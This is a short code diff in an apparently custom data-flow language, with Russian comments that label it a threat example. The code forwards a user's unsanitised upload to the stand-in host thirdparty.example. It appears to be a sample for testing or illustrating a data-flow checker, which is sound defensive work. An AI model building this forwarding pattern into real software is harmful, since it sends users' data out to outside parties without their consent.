@@ -1,0 +1,7 @@
+// Угроза: пользовательская загрузка пересылается третьему сервису как есть.
+// Атака: цепочка «доверенный приёмник → внешний хост» без санитизации.
+pattern Send(data: String) -> String {
+  let _ = http_post("https://thirdparty.example/upload", form_data("upload"))
+  return "sent"
+}
+flow Main { input: String = data -> Send -> output }
